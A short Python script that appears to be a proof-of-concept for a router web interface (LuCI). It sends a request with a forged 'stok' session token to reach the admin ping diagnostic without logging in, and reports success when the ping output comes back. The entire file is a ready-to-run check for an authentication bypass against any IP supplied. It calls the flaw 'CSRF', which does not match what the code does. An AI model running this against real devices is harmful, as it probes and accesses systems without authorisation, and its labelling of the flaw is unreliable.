#!/usr/bin/python
import sys, requests

def check_args():

        if len(sys.argv) != 2:
            print(sys.argv[0]+" <ip-address>")
            exit(2)
        else:
            global ip
            ip = sys.argv[1]

def get(page):

    URL = 'http://'+ip+'/cgi-bin/luci/'
    session = requests.session()
    r = session.get(URL+page)
    return r.text

def main():
    
    check_args()

    page = str(get(';stok=anything/admin/network/diag_ping/localhost'))
    if page[:14] == 'PING localhost':
        print('CSRF found')
    else:
        print('CSRF not found')

main()
